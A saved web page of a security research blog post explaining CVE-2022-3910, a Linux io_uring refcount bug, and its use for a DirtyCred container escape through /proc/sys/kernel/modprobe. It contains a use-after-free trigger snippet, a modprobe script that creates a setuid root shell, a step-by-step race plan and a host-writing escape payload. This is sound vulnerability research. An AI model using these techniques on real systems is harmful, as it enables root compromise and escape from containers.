<!DOCTYPE html>
<!-- saved from url=(0094)https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/ -->
<html lang="en" dir="auto"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
<meta http-equiv="X-UA-Compatible" content="IE=edge">
<meta name="viewport" content="width=device-width, initial-scale=1, shrink-to-fit=no">
<meta name="robots" content="index, follow">
<title>A new method for container escape using file-based DirtyCred | STAR Labs</title>
<meta name="keywords" content="">
<meta name="description" content="Recently, I was trying out various exploitation techniques against a Linux kernel vulnerability, CVE-2022-3910. After successfully writing an exploit which made use of DirtyCred to gain local privilege escalation, my mentor Billy asked me if it was possible to tweak my code to facilitate a container escape by overwriting /proc/sys/kernel/modprobe instead.
The answer was more complicated than expected; this led me down a long and dark rabbit hole…
In this post, I will discuss the root cause of the vulnerability, as well as the various methods I used to exploit it.">
<meta name="author" content="Choo Yi Kai">
<link rel="canonical" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/">
<link crossorigin="anonymous" href="https://starlabs.sg/assets/css/stylesheet.min.ec8da366ca2fb647537ccb7a8f6fa5b4e9cd3c7a0d3171dd2d3baad1e49c8bfc.css" integrity="sha256-7I2jZsovtkdTfMt6j2+ltOnNPHoNMXHdLTuq0eSci/w=" rel="preload stylesheet" as="style">
<script defer="" crossorigin="anonymous" src="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/highlight.min.2840b7fccd34145847db71a290569594bdbdb00047097f75d6495d162f5d7dff.js.下載" integrity="sha256-KEC3/M00FFhH23GikFaVlL29sABHCX911kldFi9dff8=" onload="hljs.initHighlightingOnLoad();"></script>
<link rel="icon" href="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/logo-white.png">
<link rel="icon" type="image/png" sizes="16x16" href="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/logo-white.png">
<link rel="icon" type="image/png" sizes="32x32" href="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/logo-white.png">
<link rel="apple-touch-icon" href="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/logo-white.png">
<link rel="mask-icon" href="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/logo-white.png">
<meta name="theme-color" content="#2e2e33">
<meta name="msapplication-TileColor" content="#2e2e33">
<noscript>
    <style>
        #theme-toggle,
        .top-link {
            display: none;
        }

    </style>
</noscript>
<script async="" src="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/js"></script>
<script>
var doNotTrack = false;
if (!doNotTrack) {
	window.dataLayer = window.dataLayer || [];
	function gtag(){dataLayer.push(arguments);}
	gtag('js', new Date());
	gtag('config', 'G-0F9M1FRFWQ', { 'anonymize_ip': false });
}
</script>
<meta property="og:title" content="A new method for container escape using file-based DirtyCred">
<meta property="og:description" content="Recently, I was trying out various exploitation techniques against a Linux kernel vulnerability, CVE-2022-3910. After successfully writing an exploit which made use of DirtyCred to gain local privilege escalation, my mentor Billy asked me if it was possible to tweak my code to facilitate a container escape by overwriting /proc/sys/kernel/modprobe instead.
The answer was more complicated than expected; this led me down a long and dark rabbit hole…
In this post, I will discuss the root cause of the vulnerability, as well as the various methods I used to exploit it.">
<meta property="og:type" content="article">
<meta property="og:url" content="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/"><meta property="og:image" content="https://starlabs.sg/logo-white.png"><meta property="article:section" content="blog">
<meta property="article:published_time" content="2023-07-25T00:00:00+00:00">
<meta property="article:modified_time" content="2023-07-25T00:00:00+00:00"><meta property="og:site_name" content="STAR Labs">
<meta name="twitter:card" content="summary_large_image">
<meta name="twitter:image" content="https://starlabs.sg/logo-white.png">
<meta name="twitter:title" content="A new method for container escape using file-based DirtyCred">
<meta name="twitter:description" content="Recently, I was trying out various exploitation techniques against a Linux kernel vulnerability, CVE-2022-3910. After successfully writing an exploit which made use of DirtyCred to gain local privilege escalation, my mentor Billy asked me if it was possible to tweak my code to facilitate a container escape by overwriting /proc/sys/kernel/modprobe instead.
The answer was more complicated than expected; this led me down a long and dark rabbit hole…
In this post, I will discuss the root cause of the vulnerability, as well as the various methods I used to exploit it.">
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BreadcrumbList",
  "itemListElement": [
    {
      "@type": "ListItem",
      "position":  1 ,
      "name": "Blogs",
      "item": "https://starlabs.sg/blog/"
    }, 
    {
      "@type": "ListItem",
      "position":  2 ,
      "name": "A new method for container escape using file-based DirtyCred",
      "item": "https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/"
    }
  ]
}
</script>
<script type="application/ld+json">
{
  "@context": "https://schema.org",
  "@type": "BlogPosting",
  "headline": "A new method for container escape using file-based DirtyCred",
  "name": "A new method for container escape using file-based DirtyCred",
  "description": "Recently, I was trying out various exploitation techniques against a Linux kernel vulnerability, CVE-2022-3910. After successfully writing an exploit which made use of DirtyCred to gain local privilege escalation, my mentor Billy asked me if it was possible to tweak my code to facilitate a container escape by overwriting /proc/sys/kernel/modprobe instead.\nThe answer was more complicated than expected; this led me down a long and dark rabbit hole\u0026hellip;\nIn this post, I will discuss the root cause of the vulnerability, as well as the various methods I used to exploit it.",
  "keywords": [
    
  ],
  "articleBody": "Recently, I was trying out various exploitation techniques against a Linux kernel vulnerability, CVE-2022-3910. After successfully writing an exploit which made use of DirtyCred to gain local privilege escalation, my mentor Billy asked me if it was possible to tweak my code to facilitate a container escape by overwriting /proc/sys/kernel/modprobe instead.\nThe answer was more complicated than expected; this led me down a long and dark rabbit hole…\nIn this post, I will discuss the root cause of the vulnerability, as well as the various methods I used to exploit it.\nAll code snippets shown were taken from the source code of Linux kernel v6.0-rc5, the latest affected version.\nIntroduction to relevant io_uring components io_uring has already been introduced pretty well in this post a while back, so I will not cover the same details again. Instead, let’s focus on the relevant components for this particular vulnerability.\nBoth components are discussed briefly in Jens Axboe’s slides here.\nFixed files Fixed files, or direct descriptors, can be thought of as io_uring-specific file desciptors. io_uring maintains a reference to any registered files to reduce additional overhead incurred by the resolution of file descriptors for each operation involving them; this reference is only released when the fixed files are unregistered or the io_uring instance is torn down.\nFixed files can be registered by passing an array of file descriptors to io_uring_register(). Alternatively, io_uring can be instructed to register one directly (without the userland program first having to grab a file descriptor using some other system call) using a variety of functions such as io_uring_prep_openat_direct(). Subsequently, these can be referenced in future SQEs by setting the IOSQE_FIXED_FILE flag and passing the index of the fixed file within the array of registered files instead of the actual file descriptor.\nRing messages io_uring supports message passing between rings with io_uring_prep_msg_ring(). More specifically, according to the man page, this operation creates a CQE in the target ring with its res and user_data set to user-specified values.\nAs noted here, this functionality could be used to wake sleeping tasks waiting on a ring, or simply to pass arbitrary information.\nThe vulnerability CVE-2022-3910 is an improper refcount update in the io_msg_ring() function. The source file is here, but the relevant code snippet is shown below:\nint io_msg_ring(struct io_kiocb *req, unsigned int issue_flags) { struct io_msg *msg = io_kiocb_to_cmd(req, struct io_msg); int ret; ret = -EBADFD; if (!io_is_uring_fops(req-file)) goto done; switch (msg-cmd) { case IORING_MSG_DATA: ret = io_msg_ring_data(req); break; case IORING_MSG_SEND_FD: ret = io_msg_send_fd(req, issue_flags); break; default: ret = -EINVAL; break; } done: if (ret  0) req_set_fail(req); io_req_set_res(req, ret, 0); /* put file to avoid an attempt to IOPOLL the req */ io_put_file(req-file); req-file = NULL; return IOU_OK; } A hint for the vulnerability itself can be found in the commit message for the patch:\nOrdinarily, the message passing functionality of io_uring expects a file descriptor corresponding to another io_uring instance. If we pass in a reference to anything else, it’s simply dropped with a call to io_put_file() and an error is returned.\nIf we pass in a fixed file, io_put_file() is still invoked. But this behaviour is actually incorrect! We did not grab an additional reference to the file, so we should not have decremented the refcount.\nImmediate consequences io_put_file() is simply a wrapper to fput(). You can find its source code here, but the following understanding is sufficient:\nvoid fput(struct file *file) { if (atomic_long_dec_and_test(\u0026file-f_count)) { // free the file struct \t} } In other words, by repeatedly triggering the vulnerability until the refcount drops to 0, we can free the associated file struct while io_uring continues to hold a reference to it. This constitutes a use-after-free.\nHere’s some code showing how we might do so:\nstruct io_uring r; io_uring_queue_init(8, \u0026r, 0); int target = open(TARGET_PATH, O_RDWR | O_CREAT | O_TRUNC, 0644); // Register target file as fixed file. if (io_uring_register_files(\u0026r, \u0026target, 1)  0) { perror(\"[-] io_uring_register_files\"); } struct io_uring_sqe * sqe; // Refcount is currently 2 // (Check by by setting a breakpoint in io_msg_ring()) for (int i=0; i2; i++) { sqe = io_uring_get_sqe(\u0026r); io_uring_prep_msg_ring(sqe, 0, 0, 0, 0); sqe-flags |= IOSQE_FIXED_FILE; io_uring_submit(\u0026r); io_uring_wait_cqe(\u0026r, \u0026cqe); io_uring_cqe_seen(\u0026r, cqe); } // Refcount should now be 0, file struct should be freed. My initial attempt at an exploit made use of a bunch of cross-cache sprays and ultimately overwriting the destructor of an sk_buff struct (not the sk_buff-data allocation, as its minimum size is too large) to gain execution control.\nThis “standard” exploit is not the main focus of this post, but you can check out my code here if you are interested. I was unable to find another writeup online that made use of sk_buff in the same way I did, so I figured it was worth mentioning briefly.\nDirtyCred After I completed the abovementioned exploit, Billy encouraged me to try and write a different one making use of DirtyCred instead.\nDirtyCred is a data-only attack that targets file and cred structs. The original slides explain the concept more clearly than I can, so if you are unfamiliar with the technique, I suggest reading this first. Of particular relevance is the section “Attacking Open File Credentials”, which is precisely what we will be using.\nThe file struct As its name suggests, a file struct represents an open file and is allocated in the filp slab cache whenever a file is opened. Each file struct keeps track of its own refcount, which can be modified through operations such as dup() and close(). When the refcount hits zero, the struct is freed.\nSome important members of this structure are shown below:\nstruct file { // ...  const struct file_operations * f_op; /* 40 8 */ // ...  atomic_long_t f_count; /* 56 8 */ // ...  fmode_t f_mode; /* 68 4 */ // ...  /* size: 232, cachelines: 4, members: 20 */ } __attribute__((__aligned__(8))); Let’s go over each of these briefly:\n f_op is a pointer to a function table that dictates which handler is invoked when an operation is requested on the file. For example, this is ext4_file_operations for all files living on an ext4 filesystem. f_count stores the refcount for the file. f_mode stores the access mode for the file. This includes flags such as whether we are allowed to read from or write to it.   Note: when we open() the same file multiple times, multiple file structs are allocated. In comparison, when we call dup() on a file descriptor, the refcount of an existing file struct is incremented, and no new allocations are made.\n Code analysis Now let’s try to understand how exactly DirtyCred works. Suppose we’ve opened file A with access mode O_RDWR and we attempt to write to it. This eventually calls vfs_write(), shown below:\nssize_t vfs_write(struct file *file, const char __user *buf, size_t count, loff_t *pos) { ssize_t ret; // Permission checks occur here \tif (!(file-f_mode \u0026 FMODE_WRITE)) return -EBADF; if (!(file-f_mode \u0026 FMODE_CAN_WRITE)) return -EINVAL; if (unlikely(!access_ok(buf, count))) return -EFAULT; ret = rw_verify_area(WRITE, file, pos, count); if (ret) return ret; if (count  MAX_RW_COUNT) count = MAX_RW_COUNT; // Actual write occurs down here \tfile_start_write(file); if (file-f_op-write) ret = file-f_op-write(file, buf, count, pos); else if (file-f_op-write_iter) ret = new_sync_write(file, buf, count, pos); else ret = -EINVAL; if (ret  0) { fsnotify_modify(file); add_wchar(current, ret); } inc_syscw(current); file_end_write(file); return ret; } Suppose that, after the permission checks are done but before the actual write has begun, we managed to free file A’s file struct and spray a new one corresponding to a different file B, which we opened with access mode O_RDONLY. The access mode won’t be checked again, so the write will be performed on file B, even though we should not be allowed to do that!\nBut is it possible to consistently win this race?\nTraditional DirtyCred: targeting ext4 files In a typical application of DirtyCred, both files A and B reside on an ext4 filesystem. In this scenario, the write is eventually handled by ext4_buffered_write_iter():\nstatic ssize_t ext4_buffered_write_iter(struct kiocb *iocb, struct iov_iter *from) { ssize_t ret; struct inode *inode = file_inode(iocb-ki_filp); // Local variable!  if (iocb-ki_flags \u0026 IOCB_NOWAIT) return -EOPNOTSUPP; inode_lock(inode); // \tret = ext4_write_checks(iocb, from); if (ret  0) goto out; current-backing_dev_info = inode_to_bdi(inode); ret = generic_perform_write(iocb, from); // Actual write occurs in here \tcurrent-backing_dev_info = NULL; out: inode_unlock(inode); // \tif (likely(ret  0)) { iocb-ki_pos += ret; ret = generic_write_sync(iocb, ret); } return ret; } ssize_t generic_perform_write(struct kiocb *iocb, struct iov_iter *i) { struct file *file = iocb-ki_filp; // ... } To avoid problems arising from multiple tasks writing concurrently to the same file, the write operation is enclosed within a mutex. In other words, only one process can write to the file at any given time. This allows us to stabilise the exploit with the idea shown in the diagram below (taken from the DirtyCred slides):\nWhen thread A performs a slow write to file A, it grabs the corresponding inode’s lock. This prevents thread B from entering the critical region between [A] and [B]. We could make use of this waiting period to swap out file A’s file struct with that of file B’s. When thread A releases the inode lock, thread B grabs it and proceeds to perform the write on the wrong file.\nLocal privilege escalation It is not difficult to see how such a primitive would allow us to achieve local privilege escalation. One possibility would be to to add a new user with root privileges by targeting /etc/passwd. But I took a different approach, targeting /sbin/modprobe instead.\nWhen we attempt to execute a file with unknown magic header, the kernel will invoke the binary pointed to by the global kernel variable modprobe_path with root privileges and from the root namespace. By default, this is /sbin/modprobe.\nHence, I overwrote /sbin/modprobe with the following shell script:\n#!/bin/sh cp /bin/sh /tmp/sh chmod 4777 /tmp/sh When I tried to execute a file with an invalid magic header, the kernel executed the above script, creating a setuid copy of /bin/sh. We now have a root shell.\nThe rabbit hole When I showed my exploit to Billy, he pointed out that my approach wouldn’t work in a containerised environment, as /sbin/modprobe wouldn’t be reachable from the container’s namespace. Instead, he asked if we could target the modprobe_path variable directly, through /proc/sys/kernel/modprobe.\nThe /proc filesystem and you /proc is a pseudo-filesystem that “acts as an interface to internal data structures in the kernel”. In particular, the /proc/sys subdirectory allows us to change the value of various kernel parameters, simply by writing to them as if they were a file.\nAs a relevant example, /proc/sys/kernel/modprobe is aliased directly to the modprobe_path kernel global variable, and writing to this “file” will correspondingly change the value of modprobe_path.\n Important: we cannot write to anything in /proc/sys/* if we aren’t root. But this is not a big problem, because we can just leverage traditional DirtyCred to get local privilege escalation by targeting /etc/passwd beforehand.\n It should be clear that these file operations require special handler functions. file structs associated with /proc/sys/* “files” have f_op set to proc_sys_file_operations.\nThis creates a problem, because the inode locking technique from earlier relies on the assumption that ext4_buffered_write_iter() can still successfully write to the target file. Actually attempting to do this with a /proc/sys/* file will cause undefined behaviour, which usually results in an error code being returned.\nInstead, we will have to swap out the file structs before the call to the write handler is resolved, meaning that we have the following race window:\nssize_t vfs_write(struct file *file, const char __user *buf, size_t count, loff_t *pos) { ssize_t ret; if (!(file-f_mode \u0026 FMODE_WRITE)) return -EBADF; if (!(file-f_mode \u0026 FMODE_CAN_WRITE)) return -EINVAL; // RACE WINDOW START \tif (unlikely(!access_ok(buf, count))) return -EFAULT; ret = rw_verify_area(WRITE, file, pos, count); if (ret) return ret; if (count  MAX_RW_COUNT) count = MAX_RW_COUNT; file_start_write(file); // RACE WINDOW END \tif (file-f_op-write) ret = file-f_op-write(file, buf, count, pos); else if (file-f_op-write_iter) ret = new_sync_write(file, buf, count, pos); else ret = -EINVAL; if (ret  0) { fsnotify_modify(file); add_wchar(current, ret); } inc_syscw(current); file_end_write(file); return ret; } That’s pretty small. Can we improve our chances?\nA new target: aio_write() The kernel AIO subsystem (not to be confused with POSIX AIO) is a somewhat obsolete asynchronous I/O interface which could be considered as a predecessor to io_uring. Billy pointed me towards the aio_write() function, which will be invoked if we request a write syscall through the kernel AIO interface:\nstatic int aio_write(struct kiocb *req, const struct iocb *iocb, bool vectored, bool compat) { struct iovec inline_vecs[UIO_FASTIOV], *iovec = inline_vecs; struct iov_iter iter; struct file *file; int ret; ret = aio_prep_rw(req, iocb); if (ret) return ret; file = req-ki_filp; if (unlikely(!(file-f_mode \u0026 FMODE_WRITE))) return -EBADF; if (unlikely(!file-f_op-write_iter)) return -EINVAL; ret = aio_setup_rw(WRITE, iocb, \u0026iovec, vectored, compat, \u0026iter); if (ret  0) return ret; ret = rw_verify_area(WRITE, file, \u0026req-ki_pos, iov_iter_count(\u0026iter)); if (!ret) { /* * Open-code file_start_write here to grab freeze protection, * which will be released by another thread in * aio_complete_rw(). Fool lockdep by telling it the lock got * released so that it doesn't complain about the held lock when * we return to userspace. */ if (S_ISREG(file_inode(file)-i_mode)) { sb_start_write(file_inode(file)-i_sb); __sb_writers_release(file_inode(file)-i_sb, SB_FREEZE_WRITE); } req-ki_flags |= IOCB_WRITE; aio_rw_done(req, call_write_iter(file, req, \u0026iter)); } kfree(iovec); return ret; } aio_setup_rw() copies iovecs from userland using copy_from_user(). Furthermore, it lies within our race window (after the permissions check, but before the write handler gets resolved). As such, if we have access to userfaultfd or FUSE, we can consistently win the race, allowing us to redirect the write operation to /proc/sys/kernel/modprobe.\nBut wait. Why would anyone need to enable FUSE or kernel page fault handling for userfaultfd within a container? The sad truth is that the conditions necessary to utilise the aforementioned technique are far too stringent to be useful in an average real-world exploitation scenario.\n Note: technically, even if userfaultfd kernel page fault handling is disabled, we could still use it if we have the CAP_SYS_PTRACE capability (the actual check is here). However, in general, we are unlikely to have this even as container root.\n Unless…\nSlow page fault to the rescue Let’s think about the role being played by userfaultfd and FUSE in our exploit technique so far. When the kernel encounters a page fault while trying to copy data from userland:\n userfaultfd causes the faulting kernel thread to pause until we handle the page fault from userland. Our custom FUSE read handler is invoked when the kernel tries to load the faulting page into memory.  In both of these cases, we can simply stall the kernel thread at this copy_from_user() call until we’re done with other stuff, like spraying the heap. But is it possible to make the page fault take so long that we could complete our heap spray during that time window?\nAfter I spent a few attempts experimenting with various ideas which didn’t work too well, Billy suggested adapting this method to significantly increase the delay created by a page fault (image from Google CTF discord):\nshmem_fault() contains a helpful comment which explains why this is the case:\n/* * Trinity finds that probing a hole which tmpfs is punching can * prevent the hole-punch from ever completing: which in turn * locks writers out with its hold on i_rwsem. So refrain from * faulting pages into the hole while it's being punched. Although * shmem_undo_range() does remove the additions, it may be unable to * keep up, as each new page needs its own unmap_mapping_range() call, * and the i_mmap tree grows ever slower to scan if new vmas are added. * * It does not matter if we sometimes reach this check just before the * hole-punch begins, so that one fault then races with the punch: * we just need to make racing faults a rare case. * * The implementation below would be much simpler if we just used a * standard mutex or completion: but we cannot take i_rwsem in fault, * and bloating every shmem inode for this unlikely case would be sad. */ Putting it all together In summary, our plan of attack is as follows:\n Open some random file, file A, with access mode O_RDWR. The kernel will allocate a corresponding file struct. Using the vulnerability, repeatedly decrement the refcount of file A’s file struct until it underflows. This frees it, although the file descriptor table still contains a reference to it.   Note: this is necessary, because fget() (which will be called when we submit the AIO request later) will cause the kernel to stall if called on a file struct with refcount 0. The offending code is here (check the macro expansion of get_file_rcu).\n Create and obtain a file descriptor for a temporary file B using memfd_create(). Allocate a large amount of memory to it using fallocate(). Prepare an AIO request using a buffer that lies across a page boundary. The second page should be backed by file B, and not yet be resident in memory. (CPU 1, thread X): Call fallocate() on file B with mode FALLOC_FL_PUNCH_HOLE | FALLOC_FL_KEEP_SIZE. (CPU 1, thread Y): Submit the AIO request. This triggers a page fault for the page backed by file B. As a hole punch is in progress, thread Y will put itself on a wait queue, stalling execution until thread X is done. (CPU 0, thread Z): While thread Y is stalled, repeatedly call open() on /proc/sys/kernel/modprobe to spray the heap with corresponding file structs, overwriting file A’s file struct with that of /proc/sys/kernel/modprobe. Thread Y resumes execution and the write is performed on /proc/sys/kernel/modprobe.  You can find the source code for the exploit here.\nTesting against actual containers Once all that was done, I proceeded to try my exploit against some test containers I set up on a vulnerable Ubuntu Kinetic image. This was NOT running kernel version v6.0-rc5, but there were little to no changes to any code relevant to the exploit, so this should not be a problem.\n Note: More specifically, I used this image, then downgraded the kernel manually to an affected version (ubuntu 5.19.0-21-generic).\n To demonstrate a successful container escape without making things too complicated, I opted for a simple payload which creates a file on the host’s system (outside the container):\n#!/bin/sh path=$(sed -n 's/.*\\perdir=\\([^,]*\\).*/\\1/p' /proc/mounts) echo \"container escape\"  /home/amarok/c Standard Docker container Command: sudo docker run -it --rm ubuntu bash\nSurprisingly, my exploit did not work against the first test target. Instead, I received Permission denied instead. What’s going on?\nAs it turns out, after the call to aio_setup_rw(), rw_verify_area() calls a security hook function. By default, Docker containers are run under a restricted AppArmor profile, so the additional permissions check in aa_file_perm() fails, causing aio_write() to return without actually carrying out the write operation. 😥\nDocker container with apparmor=unconfined Command: sudo docker run -it --rm --security-opt apparmor=unconfined ubuntu bash\nIf the Docker container is run with apparmor=unconfined, however, aa_file_perm() exits early before the actual permissions check occurs, allowing our exploit to go through just fine.\nThis scenario isn’t super useful, because it’s unlikely that someone would go out of their way to disable AppArmor on a deployed Docker container.\nStandard containerd container Command: sudo ctr run -t --rm docker.io/library/ubuntu:latest bash\nIf we instead spin up a container using the ctr command-line client that operates directly on top of containerd’s API, the exploit works just fine as well. That’s neat! We can use this technique to escape out-of-the-box containerd containers. This is a much more realistic use case for this technique. 🙂\nDemo It’s morbin’ Demo Time. Here’s a video of the exploit in action against a fresh containerd container:\n  Acknowledgements I would like to thank:\n My mentor Billy for taking my seemingly-ridiculous idea and managing to help me refine and stabilise it into a new and consistent container escape technique. Everyone else at Star Labs :) @pql for the slow page technique.  References io_uring\n https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf https://lwn.net/Articles/863071/ https://github.com/axboe/liburing/wiki/io_uring-and-networking-in-2023#ring-messages  DirtyCred\n https://i.blackhat.com/USA-22/Thursday/US-22-Lin-Cautious-A-New-Exploitation-Method.pdf https://blog.hacktivesecurity.com/index.php/2022/12/21/cve-2022-2602-dirtycred-file-exploitation-applied-on-an-io_uring-uaf/ https://lkmidas.github.io/posts/20210223-linux-kernel-pwn-modprobe/#the-overwriting-modprobe_path-technique  /proc filesystem\n https://docs.kernel.org/filesystems/proc.html  Kernel AIO\n https://blog.cloudflare.com/io_submit-the-epoll-alternative-youve-never-heard-about/  fallocate() slow page\n https://gist.github.com/pqlx/b1ed41e7557c042bcc7a8c74ea1feae8  ",
  "wordCount" : "3334",
  "inLanguage": "en",
  "datePublished": "2023-07-25T00:00:00Z",
  "dateModified": "2023-07-25T00:00:00Z",
  "author":{
    "@type": "Person",
    "name": "Choo Yi Kai"
  },
  "mainEntityOfPage": {
    "@type": "WebPage",
    "@id": "https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/"
  },
  "publisher": {
    "@type": "Organization",
    "name": "STAR Labs",
    "logo": {
      "@type": "ImageObject",
      "url": "https://starlabs.sg/logo-white.png"
    }
  }
}
</script>
<style type="text/css">@font-face {
  font-family: 'rbicon';
  src: url(chrome-extension://dipiagiiohfljcicegpgffpbnjmgjcnf/fonts/rbicon.woff2) format("woff2");
  font-weight: normal;
  font-style: normal; }
</style></head>
<body class=" dark" id="top">
<header class="header">
<nav class="nav">
<div class="logo">
<a href="https://starlabs.sg/" accesskey="h" title="  (Alt + H)">
<img src="./A new method for container escape using file-based DirtyCred _ STAR Labs_files/logo-white.png" alt="logo" aria-label="logo" height="35"> </a>
<span class="logo-switches">
</span>
</div>
<ul id="menu">
<li>
<a href="https://starlabs.sg/" title="Home">
<span>Home</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/about/" title="About">
<span>About</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/advisories/" title="Advisories">
<span>Advisories</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/blog/" title="Blog">
<span>Blog</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/achievements/" title="Achievements">
<span>Achievements</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/publications/" title="Publications">
<span>Publications</span>
</a>
</li>
<li>
<a href="https://starlabs.sg/search/" title="Search (Alt + /)" accesskey="/">
<span>Search</span>
</a>
</li>
</ul>
</nav>
</header>
<main class="main">
<article class="post-single">
<header class="post-header">
<div class="breadcrumbs"><a href="https://starlabs.sg/">Home</a>&nbsp;»&nbsp;<a href="https://starlabs.sg/blog/">Blogs</a></div>
<h1 class="post-title">
A new method for container escape using file-based DirtyCred
</h1>
<div class="post-meta"><span title="2023-07-25 00:00:00 +0000 UTC">July 25, 2023</span>&nbsp;·&nbsp;16 min&nbsp;·&nbsp;Choo Yi Kai
</div>
</header> <div class="toc">
<details>
<summary accesskey="c" title="(Alt + C)">
<span class="details">Table of Contents</span>
</summary>
<div class="inner"><ul>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#introduction-to-relevant-io_uring-components" aria-label="Introduction to relevant io_uring components">Introduction to relevant io_uring components</a><ul>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#fixed-files" aria-label="Fixed files">Fixed files</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#ring-messages" aria-label="Ring messages">Ring messages</a></li></ul>
</li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#the-vulnerability" aria-label="The vulnerability">The vulnerability</a><ul>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#immediate-consequences" aria-label="Immediate consequences">Immediate consequences</a></li></ul>
</li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#dirtycred" aria-label="DirtyCred">DirtyCred</a><ul>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#the-file-struct" aria-label="The file struct">The <code>file</code> struct</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#code-analysis" aria-label="Code analysis">Code analysis</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#traditional-dirtycred-targeting-ext4-files" aria-label="Traditional DirtyCred: targeting ext4 files">Traditional DirtyCred: targeting ext4 files</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#local-privilege-escalation" aria-label="Local privilege escalation">Local privilege escalation</a></li></ul>
</li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#the-rabbit-hole" aria-label="The rabbit hole">The rabbit hole</a><ul>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#the-proc-filesystem-and-you" aria-label="The /proc filesystem and you">The <code>/proc</code> filesystem and you</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#a-new-target-aio_write" aria-label="A new target: aio_write()">A new target: <code>aio_write()</code></a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#slow-page-fault-to-the-rescue" aria-label="Slow page fault to the rescue">Slow page fault to the rescue</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#putting-it-all-together" aria-label="Putting it all together">Putting it all together</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#testing-against-actual-containers" aria-label="Testing against actual containers">Testing against actual containers</a><ul>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#standard-docker-container" aria-label="Standard Docker container">Standard Docker container</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#docker-container-with-apparmorunconfined" aria-label="Docker container with apparmor=unconfined">Docker container with <code>apparmor=unconfined</code></a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#standard-containerd-container" aria-label="Standard containerd container">Standard containerd container</a></li></ul>
</li></ul>
</li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#demo" aria-label="Demo">Demo</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#acknowledgements" aria-label="Acknowledgements">Acknowledgements</a></li>
<li>
<a href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#references" aria-label="References">References</a>
</li>
</ul>
</div>
</details>
</div>
<div class="post-content"><p>Recently, I was trying out various exploitation techniques against a Linux kernel vulnerability, <a href="https://nvd.nist.gov/vuln/detail/CVE-2022-3910">CVE-2022-3910</a>. After successfully writing an exploit which made use of DirtyCred to gain local privilege escalation, my mentor Billy asked me if it was possible to tweak my code to facilitate a container escape by overwriting <code>/proc/sys/kernel/modprobe</code> instead.</p>
<p>The answer was more complicated than expected; this led me down a long and dark rabbit hole…</p>
<p>In this post, I will discuss the root cause of the vulnerability, as well as the various methods I used to exploit it.</p>
<p>All code snippets shown were taken from the source code of Linux kernel v6.0-rc5, the latest affected version.</p>
<h2 id="introduction-to-relevant-io_uring-components">Introduction to relevant io_uring components<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#introduction-to-relevant-io_uring-components">#</a></h2>
<p>io_uring has already been introduced pretty well in <a href="https://starlabs.sg/blog/2022/06-io_uring-new-code-new-bugs-and-a-new-exploit-technique/#what-is-io_uring">this post</a> a while back, so I will not cover the same details again. Instead, let’s focus on the relevant components for this particular vulnerability.</p>
<p>Both components are discussed briefly in Jens Axboe’s slides <a href="https://kernel-recipes.org/en/2022/wp-content/uploads/2022/06/axboe-kr2022-1.pdf">here</a>.</p>
<h3 id="fixed-files">Fixed files<a hidden="" class="anchor" aria-hidden="true" href="https://starlabs.sg/blog/2023/07-a-new-method-for-container-escape-using-file-based-dirtycred/#fixed-files">#</a></h3>
